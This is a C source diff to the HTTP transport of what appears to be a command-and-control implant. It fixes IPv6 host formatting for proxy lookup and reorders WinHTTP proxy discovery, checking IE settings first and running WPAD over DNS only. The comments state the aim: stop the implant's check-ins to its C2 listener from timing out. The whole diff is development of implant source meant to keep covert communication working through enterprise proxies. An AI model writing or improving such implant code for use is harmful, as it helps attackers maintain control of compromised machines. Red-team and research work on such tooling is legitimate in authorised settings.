@@ -104,7 +104,10 @@ static LPWSTR HttpComposeUrlForProxyLookup(
 {
     PHOST_DATA H;
     LPCWSTR    scheme;
+    LPCWSTR    hostUse;
     INT        nw;
+    WCHAR      HostNz[ 128 ] = { 0 };
+    SIZE_T     zi;
 
     if ( ! Buf || CchBuf < 16 || ! RelativePath ) {
         return RelativePath;
@@ -119,16 +122,41 @@ static LPWSTR HttpComposeUrlForProxyLookup(
         return RelativePath;
     }
 
-    scheme = Instance->Config.Transport.Secure ? L"https://" : L"http://";
+    scheme  = Instance->Config.Transport.Secure ? L"https://" : L"http://";
+    hostUse = H->Host;
 
-    /* IPv6 literals contain ':' — RFC 3986 requires brackets around the host. */
-    if ( WcsStr( H->Host, L":" ) != NULL ) {
+    /* RFC 3986 / WinHTTP: bracketed IPv6 already includes '[' ']'; do not wrap twice. */
+    if ( hostUse[ 0 ] == L'[' ) {
+        nw = Instance->Win32.swprintf_s(
+            Buf,
+            CchBuf,
+            L"%ls%ls:%lu%ls",
+            scheme,
+            hostUse,
+            ( ULONG ) H->Port,
+            RelativePath
+        );
+    } else if ( WcsStr( H->Host, L":" ) != NULL ) {
+        /* Unbracketed IPv6: strip zone id (%scope) so WinHttpGetProxyForUrl sees a valid host. */
+        zi = 0;
+        while (
+            zi < ( sizeof( HostNz ) / sizeof( HostNz[ 0 ] ) ) - 1
+            && hostUse[ zi ]
+        ) {
+            if ( hostUse[ zi ] == L'%' ) {
+                break;
+            }
+            HostNz[ zi ] = hostUse[ zi ];
+            zi++;
+        }
+        HostNz[ zi ] = L'\0';
+
         nw = Instance->Win32.swprintf_s(
             Buf,
             CchBuf,
             L"%ls[%ls]:%lu%ls",
             scheme,
-            H->Host,
+            HostNz,
             ( ULONG ) H->Port,
             RelativePath
         );
@@ -138,7 +166,7 @@ static LPWSTR HttpComposeUrlForProxyLookup(
             CchBuf,
             L"%ls%ls:%lu%ls",
             scheme,
-            H->Host,
+            hostUse,
             ( ULONG ) H->Port,
             RelativePath
         );
@@ -359,8 +387,6 @@ BOOL HttpSend(
         }
 
     } else if ( ! Instance->LookedForProxy ) {
-        // Autodetect proxy settings using the Web Proxy Auto-Discovery (WPAD) protocol
-
         WCHAR  UrlForWinHttpProxy[ 1024 ];
         LPWSTR ProxyUrlLookup = HttpComposeUrlForProxyLookup(
             UrlForWinHttpProxy,
@@ -369,66 +395,80 @@ BOOL HttpSend(
         );
 
         /*
-         * NOTE: We use WinHttpGetProxyForUrl as the first option because
-         *       WinHttpGetIEProxyConfigForCurrentUser can fail with certain users
-         *       and also the documentation states that WinHttpGetIEProxyConfigForCurrentUser
-         *       "can be used as a fall-back mechanism" so we are using it that way
+         * IE/LAN settings first: lab VMs usually use direct outbound routing with no PAC.
+         * Historically WinHttpGetProxyForUrl(AUTO_DETECT) ran before IE lookup and DHCP WPAD
+         * could stall until check-in timed out (red-cell-c2-vudj9).
+         *
+         * When IE reports auto-detect only (or WinHttpGetIEProxyConfigForCurrentUser fails),
+         * run WPAD via DNS only - DHCP probes add multi-second latency without helping typical C2 listeners.
          */
+        if ( Instance->Win32.WinHttpGetIEProxyConfigForCurrentUser( &ProxyConfig ) ) {
+            if ( ProxyConfig.lpszProxy != NULL && StringLengthW( ProxyConfig.lpszProxy ) != 0 ) {
+                ProxyInfo.dwAccessType    = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
+                ProxyInfo.lpszProxy       = ProxyConfig.lpszProxy;
+                ProxyInfo.lpszProxyBypass = ProxyConfig.lpszProxyBypass;
 
-        AutoProxyOptions.dwFlags                = WINHTTP_AUTOPROXY_AUTO_DETECT;
-        AutoProxyOptions.dwAutoDetectFlags      = WINHTTP_AUTO_DETECT_TYPE_DHCP | WINHTTP_AUTO_DETECT_TYPE_DNS_A;
-        AutoProxyOptions.lpszAutoConfigUrl      = NULL;
-        AutoProxyOptions.lpvReserved            = NULL;
-        AutoProxyOptions.dwReserved             = 0;
-        AutoProxyOptions.fAutoLogonIfChallenged = TRUE;
+                PRINTF_DONT_SEND( "Using IE proxy %ls\n", ProxyInfo.lpszProxy );
 
-        if ( Instance->Win32.WinHttpGetProxyForUrl( Instance->hHttpSession, ProxyUrlLookup, &AutoProxyOptions, &ProxyInfo ) ) {
-            if ( ProxyInfo.lpszProxy ) {
-                PRINTF_DONT_SEND( "Using proxy %ls\n", ProxyInfo.lpszProxy );
-            }
+                Instance->SizeOfProxyForUrl = sizeof( WINHTTP_PROXY_INFO );
+                Instance->ProxyForUrl       = Instance->Win32.LocalAlloc( LPTR, Instance->SizeOfProxyForUrl );
+                MemCopy( Instance->ProxyForUrl, &ProxyInfo, Instance->SizeOfProxyForUrl );
 
-            Instance->SizeOfProxyForUrl = sizeof( WINHTTP_PROXY_INFO );
-            Instance->ProxyForUrl       = Instance->Win32.LocalAlloc( LPTR, Instance->SizeOfProxyForUrl );
-            MemCopy( Instance->ProxyForUrl, &ProxyInfo, Instance->SizeOfProxyForUrl );
-        } else {
-            // WinHttpGetProxyForUrl failed, use WinHttpGetIEProxyConfigForCurrentUser as fall-back
-            if ( Instance->Win32.WinHttpGetIEProxyConfigForCurrentUser( &ProxyConfig ) ) {
-                if ( ProxyConfig.lpszProxy != NULL && StringLengthW( ProxyConfig.lpszProxy ) != 0 ) {
-                    // IE is set to "use a proxy server"
-                    ProxyInfo.dwAccessType    = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
-                    ProxyInfo.lpszProxy       = ProxyConfig.lpszProxy;
-                    ProxyInfo.lpszProxyBypass = ProxyConfig.lpszProxyBypass;
+                ProxyConfig.lpszProxy       = NULL;
+                ProxyConfig.lpszProxyBypass = NULL;
+            } else if ( ProxyConfig.lpszAutoConfigUrl != NULL && StringLengthW( ProxyConfig.lpszAutoConfigUrl ) != 0 ) {
+                AutoProxyOptions.dwFlags           = WINHTTP_AUTOPROXY_CONFIG_URL;
+                AutoProxyOptions.dwAutoDetectFlags = 0;
+                AutoProxyOptions.lpszAutoConfigUrl = ProxyConfig.lpszAutoConfigUrl;
+                AutoProxyOptions.lpvReserved       = NULL;
+                AutoProxyOptions.dwReserved        = 0;
+                AutoProxyOptions.fAutoLogonIfChallenged = TRUE;
 
-                    PRINTF_DONT_SEND( "Using IE proxy %ls\n", ProxyInfo.lpszProxy );
+                PRINTF_DONT_SEND( "Trying to discover the proxy config via the config url %ls\n", AutoProxyOptions.lpszAutoConfigUrl );
+
+                if ( Instance->Win32.WinHttpGetProxyForUrl( Instance->hHttpSession, ProxyUrlLookup, &AutoProxyOptions, &ProxyInfo ) ) {
+                    if ( ProxyInfo.lpszProxy ) {
+                        PRINTF_DONT_SEND( "Using proxy %ls\n", ProxyInfo.lpszProxy );
+                    }
 
                     Instance->SizeOfProxyForUrl = sizeof( WINHTTP_PROXY_INFO );
                     Instance->ProxyForUrl       = Instance->Win32.LocalAlloc( LPTR, Instance->SizeOfProxyForUrl );
                     MemCopy( Instance->ProxyForUrl, &ProxyInfo, Instance->SizeOfProxyForUrl );
-
-                    // don't cleanup these values
-                    ProxyConfig.lpszProxy       = NULL;
-                    ProxyConfig.lpszProxyBypass = NULL;
-                } else if ( ProxyConfig.lpszAutoConfigUrl != NULL && StringLengthW( ProxyConfig.lpszAutoConfigUrl ) != 0 ) {
-                    // IE is set to "Use automatic proxy configuration"
-                    AutoProxyOptions.dwFlags           = WINHTTP_AUTOPROXY_CONFIG_URL;
-                    AutoProxyOptions.lpszAutoConfigUrl = ProxyConfig.lpszAutoConfigUrl;
-                    AutoProxyOptions.dwAutoDetectFlags = 0;
-
-                    PRINTF_DONT_SEND( "Trying to discover the proxy config via the config url %ls\n", AutoProxyOptions.lpszAutoConfigUrl );
-
-                    if ( Instance->Win32.WinHttpGetProxyForUrl( Instance->hHttpSession, ProxyUrlLookup, &AutoProxyOptions, &ProxyInfo ) ) {
-                        if ( ProxyInfo.lpszProxy ) {
-                            PRINTF_DONT_SEND( "Using proxy %ls\n", ProxyInfo.lpszProxy );
-                        }
-
-                        Instance->SizeOfProxyForUrl = sizeof( WINHTTP_PROXY_INFO );
-                        Instance->ProxyForUrl       = Instance->Win32.LocalAlloc( LPTR, Instance->SizeOfProxyForUrl );
-                        MemCopy( Instance->ProxyForUrl, &ProxyInfo, Instance->SizeOfProxyForUrl );
-                    }
-                } else {
-                    // IE is set to "automatically detect settings"
-                    // ignore this as we already tried
                 }
+            } else if ( ProxyConfig.fAutoDetect ) {
+                AutoProxyOptions.dwFlags                = WINHTTP_AUTOPROXY_AUTO_DETECT;
+                AutoProxyOptions.dwAutoDetectFlags      = WINHTTP_AUTO_DETECT_TYPE_DNS_A;
+                AutoProxyOptions.lpszAutoConfigUrl      = NULL;
+                AutoProxyOptions.lpvReserved            = NULL;
+                AutoProxyOptions.dwReserved             = 0;
+                AutoProxyOptions.fAutoLogonIfChallenged = TRUE;
+
+                if ( Instance->Win32.WinHttpGetProxyForUrl( Instance->hHttpSession, ProxyUrlLookup, &AutoProxyOptions, &ProxyInfo ) ) {
+                    if ( ProxyInfo.lpszProxy ) {
+                        PRINTF_DONT_SEND( "Using proxy %ls\n", ProxyInfo.lpszProxy );
+                    }
+
+                    Instance->SizeOfProxyForUrl = sizeof( WINHTTP_PROXY_INFO );
+                    Instance->ProxyForUrl       = Instance->Win32.LocalAlloc( LPTR, Instance->SizeOfProxyForUrl );
+                    MemCopy( Instance->ProxyForUrl, &ProxyInfo, Instance->SizeOfProxyForUrl );
+                }
+            }
+        } else {
+            AutoProxyOptions.dwFlags                = WINHTTP_AUTOPROXY_AUTO_DETECT;
+            AutoProxyOptions.dwAutoDetectFlags      = WINHTTP_AUTO_DETECT_TYPE_DNS_A;
+            AutoProxyOptions.lpszAutoConfigUrl      = NULL;
+            AutoProxyOptions.lpvReserved            = NULL;
+            AutoProxyOptions.dwReserved             = 0;
+            AutoProxyOptions.fAutoLogonIfChallenged = TRUE;
+
+            if ( Instance->Win32.WinHttpGetProxyForUrl( Instance->hHttpSession, ProxyUrlLookup, &AutoProxyOptions, &ProxyInfo ) ) {
+                if ( ProxyInfo.lpszProxy ) {
+                    PRINTF_DONT_SEND( "Using proxy %ls\n", ProxyInfo.lpszProxy );
+                }
+
+                Instance->SizeOfProxyForUrl = sizeof( WINHTTP_PROXY_INFO );
+                Instance->ProxyForUrl       = Instance->Win32.LocalAlloc( LPTR, Instance->SizeOfProxyForUrl );
+                MemCopy( Instance->ProxyForUrl, &ProxyInfo, Instance->SizeOfProxyForUrl );
             }
         }
 
